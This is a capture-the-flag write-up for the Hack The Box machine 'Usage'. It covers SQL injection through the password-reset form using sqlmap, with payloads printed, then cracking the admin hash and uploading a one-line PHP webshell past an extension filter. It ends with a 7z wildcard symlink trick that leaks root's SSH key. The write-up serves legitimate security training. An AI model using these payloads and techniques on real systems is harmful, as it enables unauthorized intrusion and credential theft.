# HTB - Usage

##### Ip: 10.129.30.222
##### Name: Usage
##### Rating: Easy

------------------------------------------------

![Usage.png](../assets/usage_assets/Usage.png)

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.129.30.222  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-09 12:52 CDT
Nmap scan report for 10.129.30.222
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
```

Lets add usage.htb to `/etc/hosts`

Looking at the site on port 80 we find a login:

htb_usage_site.png

We also notice a `/register` endpoint, as well as an admin page that redirects to `admin.usage.htb`, so lets add that to `/etc/hosts` as well.

Lets register an account `test@test.com:password` and login:

htb_usage_in.png

We find here a few blog entries about Server-Side Language Penetration Testing.

Not seeing much, I began testing the various fields on the site and found an interesting result in email field of the Reset Password page.

If I enter in a single quote `'` the server throws us an error.

htb_usage_error.png

This is definitely worth investigating for a SQL injection.

After spending quite awhile testing, and not finding anything, I sent a request to Burp, copied the request to a file called burp.txt, and used sqlmap to enumerate further.

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ cat burp.txt   
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6IlkxYktZdEcvTDhjRTF0QUVYaEszdnc9PSIsInZhbHVlIjoicytzNTFNczBmL0cyN1djRS8xV1p5T0FRay80U1VZS2F6M05UWDlXMnljTldMeU56WmZzeUE1K1JhMDJ4MSt2VGFya0VweHNSa2R5YkNubDE4TXd1TjRJV3lmY2loNS9ZSlRKRkZFVm1nc29sZ1R4c0QzRy92Q2JBV2huSnZrWlEiLCJtYWMiOiJkMDkyMTQzYTU2NjVjODEwMTkxNTkzNDA1ZWZjNmM4NTgxMzA5ZTU1ZTZjZjMyNWE1NGI4ZDIyNjk5MWMyN2UzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjJxNHRPdERSTFpBN2tPRUphY3pLWkE9PSIsInZhbHVlIjoibkxZa1I3TmtJUVk0Mno4cUxTWUMzTkFoYUpqR0dlaE15YkUzV3Fvc1VHTEdxUlR6OHpiSUpuUUQwQkZLQkg1eGp5U1lDRUdjNVNGelNDODhmckZDZVZ0ZFJOQmpuUk9HUTB1aTBxYWtIa1hVclQxdmhPOUFTdktBb09WU0trY0oiLCJtYWMiOiIxNjEzNTEzM2U4N2VkNjYyYjgyNmE0NGJmY2M2MWE5NTRlZWUwOTE2ODg0OTU3YjVhZTEyNGMzOTJkYzBiMjkwIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=YiNzrNxWRNzcxuA3dihvcYSKaLEJg5pek2yqT5tz&email=test
```

In sqlmap we can declare the parameter of email:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3  -p email        
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
<SNIP>
[10:10:54] [INFO] POST parameter 'email' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
[10:10:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:10:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:10:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:10:58] [INFO] target URL appears to have 8 columns in query
<SNIP>
sqlmap identified the following injection point(s) with a total of 737 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=YiNzrNxWRNzcxuA3dihvcYSKaLEJg5pek2yqT5tz&email=test' AND 2754=(SELECT (CASE WHEN (2754=2754) THEN 2754 ELSE (SELECT 3645 UNION SELECT 7270) END))-- BTrG

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=YiNzrNxWRNzcxuA3dihvcYSKaLEJg5pek2yqT5tz&email=test' AND 6371=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- kmNV
```

Cool, so now we know the parameter is vulnerable, and that there are 8 columns.

Lets dig deeper and enumerate the databases with:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3 --threads 10 -p email --dbms mysql --dbs
<SNIP>
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

usage_blog is definitely the most interesting here. Let's now check out the tables:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3 --threads 10 -p email --dbms mysql -D usage_blog --tables
<SNIP>
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

Both the `admin_users` and the `users` seem interesting, but let's check out `admin_users` first.

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ sqlmap -r burp.txt --batch --level 5 --risk 3 --threads 10 -p email --dbms mysql -D usage_blog -T admin_users --dump
```

Cool, we were able to dump the administrator hash:

htb_usage_hash.png

We can crack this using john:

htb_usage_john.png

We are now able able to login `/admin`:

htb_usage_admin.png

### Exploitation

Browsing around the site I see we have a place to edit the admin's profile and there is an upload form for a new avatar.

htb_usage_edit.png

Forms like this are definitely worth checking out.

Let's try loading a simple php webshell:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ cat cmd.php                
<?php system($_GET["cmd"]); ?>
```

Looks like we've got an error here:

htb_usage_error1.png

Let's rename the file and try again, this time capturing the request in Burp:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ mv cmd.php cmd.php.png
```

Then, once the request has been captured in Burp, let's rename the file back to cmd.php and forward the request.

htb_usage_burp1.png

We can now access our webshell at http://admin.usage.htb/uploads/images/cmd.php?cmd=whoami

htb_usage_whoami.png

Lets URL Encode a reverse shell and issue it as our command to catch a shell back as user dash:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.167] from (UNKNOWN) [10.129.186.156] 33204
whoami
dash
hostname
usage
python3 -c 'import pty;pty.spawn("/bin/bash")'
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

We can now grab the user.txt flag:

htb_usage_user.png

### Privilege Escalation

Let's grab dash's `id_rsa` key from his `/.ssh` folder and use it for some persistence in case our shell dies:

```
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ chmod 600 id_rsa  
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ ssh -i id_rsa dash@10.129.186.156                                                                                   
The authenticity of host '10.129.186.156 (10.129.186.156)' can't be established.
ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.186.156' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
```

Looking at the hidden files in Dash's home directory we find a few monit files:

```
dash@usage:~$ ls -la
total 56
drwxr-x--- 7 dash dash 4096 Dec 12 17:41 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Dec 12 17:41 .monit.pid
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1192 Dec 12 17:41 .monit.state
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 3 dash dash 4096 Dec 12 17:41 snap
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Dec 12 15:47 user.txt
```

We can run `strings` against the .monitrc file and discover a password:

htb_usage_monit.png

This doesn't work for the root user, but it does work to `su xander`, who can run with sudo something called `usage_management`.

```
dash@usage:~$ su root
Password: 
su: Authentication failure
dash@usage:~$ su xander
Password: 
xander@usage:/home/dash$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Running the file we see it uses 7z to create a zip file:

```
xander@usage:/home/dash$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17944 files, 113843123 bytes (109 MiB)                 

Creating archive: /var/backups/project.zip

Items to compress: 20928

                                                                               
Files read from disk: 17944
Archive size: 54826351 bytes (53 MiB)
Everything is Ok
```

Running `strings` against it we can see it is using 7z with the wildcard `*`.

htb_usage_strings.png

This is likely a solid path forward.

Looking around I see the HackTricks has a good write up on how to exploit this: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

```
In 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

7za a /backup/$filename.zip -t7z -snl -p$pass -- *

And you can create files in the folder were this is being executed, you could create the file @root.txt and the file root.txt being a symlink to the file you want to read:

cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt

Then, when 7z is execute, it will treat root.txt as a file containing the list of files it should compress (thats what the existence of @root.txt indicates) and when it 7z read root.txt it will read /file/you/want/to/read and as the content of this file isn't a list of files, it will throw and error showing the content.
```

Cool, lets use this to access the root id_rsa key:

```
xander@usage:/var/www/html$ touch @test.txt
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa test.txt
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54826351

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----

WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
<SNIP>
```

Let's remove all the `: No more files` and don't forget to add an empty line at the bottom and save it as root_id_rsa and `chmod 600` it.

We can then use this to login as the root user:

```
┌──(ryan㉿kali)-[~/HTB/Usage]
└─$ ssh -i root_id_rsa root@10.129.186.156
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
```

We can then grab the final flag:

htb_usage_root.png

Thanks for following along!

-Ryan

---------------------------------------------------

